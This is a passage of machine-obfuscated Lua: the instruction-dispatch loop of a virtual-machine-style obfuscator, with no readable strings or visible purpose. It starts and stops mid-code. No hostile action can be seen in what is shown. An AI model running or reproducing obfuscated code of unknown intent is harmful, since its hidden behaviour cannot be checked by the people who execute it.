A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];elseif c==293 then local D;local J;local a;local c;local C;local A;e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];else e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];end;elseif c<=296 then if c==295 then local C;local D;local S;local a;local A;local J;local c;e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];J={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;J[A]=e[o];end;S={e[c](r(J,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=S[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];D=o[3];C=e[D]for o=D+1,o[5]do C=C..e[o];end;e[o[2]]=C;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];J={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;J[A]=e[o];end;S={e[c](r(J,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=S[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];D=o[3];C=e[D]for o=D+1,o[5]do C=C..e[o];end;e[o[2]]=C;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];J={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;J[A]=e[o];end;S={e[c](r(J,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=S[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];D=o[3];C=e[D]for o=D+1,o[5]do C=C..e[o];end;e[o[2]]=C;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];J={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;J[A]=e[o];end;S={e[c](r(J,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=S[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];D=o[3];C=e[D]for o=D+1,o[5]do C=C..e[o];end;e[o[2]]=C;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];J={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;J[A]=e[o];end;S={e[c](r(J,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=S[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];D=o[3];C=e[D]for o=D+1,o[5]do C=C..e[o];end;e[o[2]]=C;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];else local o=o[2];local n={};local d=0;local l=B;for o=o+1,l do d=d+1;n[d]=e[o];end;e[o](r(n,1,l-o));B=o;end;elseif c<=297 then local D;local a;local A;local C;local c;e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];elseif c==298 then if(e[o[2]]<e[o[5]])then d=d+1;else d=d+o[3];end;else local J;local a;local c;local D;local C;local A;f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];end;elseif c<=304 then if c<=301 then if c>300 then local d=o[2];local n,l={e[d]()};local l=d+o[5]-2;local o=0;for d=d,l do o=o+1;e[d]=n[o];end;B=l;else local J;local a;local A;local D;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];c=o[2];D={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;D[A]=e[o];end;J={e[c](r(D,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=J[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];D={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;D[A]=e[o];end;J={e[c](r(D,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=J[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];c=o[2];D={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;D[A]=e[o];end;J={e[c](r(D,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=J[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];D={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;D[A]=e[o];end;J={e[c](r(D,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=J[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];D={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;D[A]=e[o];end;J={e[c](r(D,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=J[A];end;B=a;d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];if(e[o[2]]<e[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=302 then local J;local a;local c;local C;local D;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];if(e[o[2]]==e[o[5]])then d=d+1;else d=d+o[3];end;elseif c>303 then local J;local D;local a;local c;local C;local A;A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;else local J;local a;local c;local D;local C;local A;A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do 